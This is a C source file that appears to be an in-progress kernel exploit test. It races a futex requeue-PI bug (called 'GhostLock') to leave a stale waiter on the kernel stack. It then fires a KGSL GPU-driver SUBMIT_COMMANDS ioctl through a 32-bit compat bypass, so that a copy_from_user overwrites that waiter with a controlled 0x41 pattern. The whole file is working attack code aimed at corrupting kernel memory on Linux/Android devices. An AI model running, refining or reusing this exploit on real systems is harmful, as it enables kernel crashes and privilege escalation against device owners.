/**
 * test_bypass3.c — Fix EFAULT in SUBMIT_COMMANDS bypass
 *
 * Discovery: SUBMIT_COMMANDS with native cmd (0xc038093d) from 32-bit
 * reaches the regular handler directly (bypassing compat wrapper).
 * With TIF_32BIT, add_ibdesc_list uses 16B CFU @ SP+0x28!
 *
 * This test: fix the copy_from_user issue, then run full GhostLock+KGSL.
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

/* ── GhostLock ──────────────────────────────────────────────────── */
static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done, kgsl_fired;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

/* ── KGSL bypass submit ─────────────────────────────────────────── */
static int kgsl_bypass_submit(int fd, uint32_t ctx_id,
                               uint64_t gpuaddr, uint64_t sizedwords) {
    /* Allocate cmdlist buffer with mmap for guaranteed valid mapping */
    void *cmdlist = mmap(0, 0x1000, PROT_READ|PROT_WRITE,
                         MAP_ANON|MAP_PRIVATE, -1, 0);
    if (cmdlist == MAP_FAILED) {
        printf("[kgsl] mmap for cmdlist failed: %d\n", errno);
        return -1;
    }
    memset(cmdlist, 0, 0x1000);

    /* Fill ibdesc in cmdlist */
    struct { uint64_t gpuaddr; uint64_t sizedwords; } *ib = cmdlist;
    ib[0].gpuaddr = gpuaddr;
    ib[0].sizedwords = sizedwords;

    /* Build native SUBMIT_COMMANDS struct (56 bytes) */
    uint8_t sbuf[56];
    memset(sbuf, 0, 56);

    /* Use mmap'd buffer for the struct too, to rule out stack issues */
    void *sbuf_m = mmap(0, 0x1000, PROT_READ|PROT_WRITE,
                        MAP_ANON|MAP_PRIVATE, -1, 0);
    if (sbuf_m == MAP_FAILED) {
        printf("[kgsl] mmap for sbuf failed: %d\n", errno);
        munmap(cmdlist, 0x1000);
        return -1;
    }

    *(uint32_t*)(sbuf_m+0x00) = ctx_id;
    *(uint32_t*)(sbuf_m+0x04) = 0;
    /* Store as 32-bit pointer (lower 32 bits) — kernel compat_ptr handles zero-extend */
    *(uint32_t*)(sbuf_m+0x08) = (uint32_t)(uintptr_t)cmdlist;
    *(uint32_t*)(sbuf_m+0x0C) = 0;  /* upper 32 bits = 0 */
    *(uint32_t*)(sbuf_m+0x10) = 16; /* cmdlist_size */
    *(uint32_t*)(sbuf_m+0x14) = 1;  /* numcmds */
    *(uint32_t*)(sbuf_m+0x18) = 0;  /* timestamp */

    printf("[kgsl] cmdlist=%p sbuf=%p\n", cmdlist, sbuf_m);
    printf("[kgsl] ibdesc: ga=0x%016llx sw=0x%016llx\n",
           (unsigned long long)gpuaddr, (unsigned long long)sizedwords);

    errno = 0;
    int r = ioctl(fd, 0xc038093d, sbuf_m);
    printf("[kgsl] SUBMIT(0xc038093d): ret=%d errno=%d (%s)\n",
           r, errno, r<0?strerror(errno):"OK ✅");

    if (r == 0) kgsl_fired = 1;

    munmap(cmdlist, 0x1000);
    munmap(sbuf_m, 0x1000);
    return r;
}

/* ── Waiter thread: GhostLock + KGSL ───────────────────────────── */
static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);

    /* Stale waiter is now on OUR kernel stack!
     * Do KGSL bypass submit NOW — CFU will overwrite the stale waiter! */
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("[kgsl] fd=%d\n", fd);

    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, 0xc0080913, &ctx);
    printf("[kgsl] CREATE: ret=%d id=%u\n", (int)r, ctx.id);

    if (r >= 0) {
        /* Fire with crash pattern */
        kgsl_bypass_submit(fd, ctx.id, 0x0ULL, 0x4141414141414141ULL);
        ioctl(fd, 0x40040914, &ctx.id);
    }
    close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    while (!kgsl_done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  GhostLock + KGSL BYPASS CFU TEST   ║\n");
    printf("║  ⚠️  KERNEL MAY CRASH!              ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] GhostLock CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ ret=%ld (attempt %d)\n\n", r, i); break; }
        usleep(1000);
    }

    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== DONE (kernel survived) ===\n");
    printf("  CFU fired: %s\n", kgsl_fired ? "YES ⚠️" : "NO");
    return 0;
}
